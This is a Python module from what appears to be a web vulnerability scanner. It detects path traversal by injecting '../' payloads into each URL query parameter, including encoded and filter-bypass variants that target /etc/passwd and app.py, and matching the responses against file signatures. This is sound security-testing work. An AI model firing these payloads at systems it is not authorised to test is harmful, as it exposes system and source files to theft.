"""Path traversal detection.

Tries `../` sequences to escape the intended directory and looks for
generic signatures of a wrongly-disclosed file: the classic /etc/passwd
format on Unix, or Python source markers when a traversal reaches the
application's own .py files.
"""
from __future__ import annotations

import re

import requests

from ..finding import Finding
from .util import set_query_param, query_params, snippet

TRAVERSAL_TARGETS = [
    ("../" * 6 + "etc/passwd", re.compile(r"root:.*:0:0:")),
    ("..%2f" * 6 + "etc%2fpasswd", re.compile(r"root:.*:0:0:")),
    ("....//" * 6 + "etc/passwd", re.compile(r"root:.*:0:0:")),
    ("../" * 4 + "app.py", re.compile(r"(import flask|from flask|def app|Flask\()", re.IGNORECASE)),
]


def check_url_params(session: requests.Session, url: str, timeout: float = 10.0) -> list:
    findings = []
    for param in query_params(url):
        for payload, signature in TRAVERSAL_TARGETS:
            probe_url = set_query_param(url, param, payload)
            try:
                resp = session.get(probe_url, timeout=timeout)
            except requests.RequestException:
                continue
            if resp.status_code == 200 and signature.search(resp.text):
                findings.append(Finding(
                    vuln_type="path_traversal",
                    severity="high",
                    url=url,
                    parameter=param,
                    method="GET",
                    evidence={
                        "payload": payload,
                        "request_url": probe_url,
                        "matched_pattern": signature.pattern,
                        "response_snippet": snippet(resp.text),
                    },
                    description=(
                        f"Parameter '{param}' allowed reading a file outside the intended "
                        f"directory using a '../' traversal payload."
                    ),
                ))
                break  # one confirmed hit per param is enough
    return findings
